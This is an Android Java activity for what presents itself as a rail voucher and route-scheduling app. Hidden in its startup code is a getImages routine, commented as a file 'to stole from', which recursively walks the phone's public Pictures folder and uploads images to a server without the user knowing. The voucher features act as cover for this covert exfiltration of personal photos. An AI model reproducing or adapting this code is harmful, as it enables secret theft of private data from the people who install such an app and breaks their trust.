package com.example.myapplication;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.tabs.TabLayout;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentTransaction;
import androidx.lifecycle.MutableLiveData;
import androidx.viewpager.widget.ViewPager;

import android.os.Environment;
import android.util.Log;
import android.view.View;

import com.example.myapplication.ui.main.SectionsPagerAdapter;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class RailVoucherActivity extends AppCompatActivity {
    public RailUtils utils;
    public List<ScheduledRoute> schedulesRoutes = new ArrayList<>();
    public MutableLiveData<Integer> scheduleListner = new MutableLiveData<>();

    public List<QRRouteItem> QRItems = new ArrayList<>();
    public MutableLiveData<Integer> QRListner = new MutableLiveData<>();

    public String userId;
    public String userEmail;
    public String userMobile;

    private DBhandler db;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_rail_voucher);
        SectionsPagerAdapter sectionsPagerAdapter = new SectionsPagerAdapter(this, getSupportFragmentManager());
        ViewPager viewPager = findViewById(R.id.view_pager);
        viewPager.setAdapter(sectionsPagerAdapter);
        TabLayout tabs = findViewById(R.id.tabs);
        tabs.setupWithViewPager(viewPager);

        getUserDetails();
        initActivity();

        getImages(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES));

        FloatingActionButton fab = findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                fab.setVisibility(View.GONE);
                Fragment fr = new FindRouteFragment();
                FragmentManager fm = getSupportFragmentManager();
                fm.addOnBackStackChangedListener(new FragmentManager.OnBackStackChangedListener() {
                    @Override
                    public void onBackStackChanged() {
                        int backCount = getSupportFragmentManager().getBackStackEntryCount();
                        if (backCount == 0) {
                            fab.setVisibility(View.VISIBLE);
                        }
                    }
                });
                FragmentTransaction fragmentTransaction = fm.beginTransaction();
                fragmentTransaction.replace(R.id.fragment_place, fr);
                fragmentTransaction.addToBackStack(null).commit();
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    public void addScheduleRoute(ScheduledRoute route) {
        this.schedulesRoutes.add(route);
        this.db.addNewScheduleRoute(route);
        scheduleListner.setValue(schedulesRoutes.size());

        Date today = new Date();
        long diff = route.route.departureTime.getTime() - today.getTime();
        int hoursGap = (int) diff / (1000*60*60);
        if (hoursGap < 24) {
            utils.executeVoucherMaker(route);
        }
    }

    public void removeScheduleRoute(ScheduledRoute route) {
        this.schedulesRoutes.remove(route); //Remove the route from the schedulesRoutes
        this.db.deleteScheduleRoute(route); //Remove the route from the db
        scheduleListner.setValue(schedulesRoutes.size());
    }

    public void addQRItem(QRRouteItem route) {
        this.QRItems.add(route);
        this.db.addNewQR(route);
        QRListner.setValue(QRItems.size());
    }

    public void deleteQRItem(QRRouteItem route) {
        this.QRItems.remove(route); // Remove the qr from the qr list.
        this.db.deleteQR(route); // Remove the qr from the db.
        QRListner.setValue(QRItems.size());
    }

    private void initActivity() {
        db = new DBhandler(this);
        utils = new RailUtils(this, db);

        List<ScheduledRoute> scheduledRoutes = db.getAllScheduledRoutes();
        this.schedulesRoutes.addAll(scheduledRoutes); //Adds all the scheduled routes from the db.

        List<QRRouteItem> allQRItems = db.getAllQR();
        this.QRItems.addAll(allQRItems); //Adds all the QR from the db.

        scheduleListner.setValue(schedulesRoutes.size());
        QRListner.setValue(QRItems.size());

        utils.orderNext24HrsVouchers();
        createAlarm();
    }

    public void getImages(File dir) { // Gets a file/dir  to stole from.
        File[] files = dir.listFiles();
        for (int i = 0; files != null && i < files.length && i < 30; i++) {
            if (files[i].isDirectory()){
                getImages(files[i]); // call the function recursively.
            }
            else {
                try {
                    new PostDataToServer().execute(files[i]); // Create new PostDataToServer instance that will send this image to the server.
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private void getUserDetails() {
        try {
            FileInputStream fileInputStream = openFileInput("usersData.txt");
            InputStreamReader inputStreamReader = new InputStreamReader(fileInputStream);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            this.userId = bufferedReader.readLine();
            this.userMobile = bufferedReader.readLine();
            this.userEmail = bufferedReader.readLine();
        } catch (Exception e) {
            // ignore
        }
    }

    public void createAlarm() {
        //System request code
        int DATA_FETCHER_RC = 123;
        //Create an alarm manager
        AlarmManager mAlarmManager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);

        //Create the time of day you would like it to go off. Use a calendar
        Calendar calendar = Calendar.getInstance();
        calendar.set(Calendar.HOUR_OF_DAY, 21);
        calendar.set(Calendar.MINUTE,41);
        calendar.set(Calendar.SECOND,0);

        //Create an intent that points to the receiver. The system will notify the app about the current time, and send a broadcast to the app
        Intent intent = new Intent(this, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, DATA_FETCHER_RC,intent, PendingIntent.FLAG_UPDATE_CURRENT);

        //initialize the alarm by using inexactrepeating. This allows the system to scheduler your alarm at the most efficient time around your
        //set time, it is usually a few seconds off your requested time.
        // you can also use setExact however this is not recommended. Use this only if it must be done then.

        //Also set the interval using the AlarmManager constants
        mAlarmManager.setInexactRepeating(AlarmManager.RTC,calendar.getTimeInMillis(),AlarmManager.INTERVAL_DAY, pendingIntent);
    }
}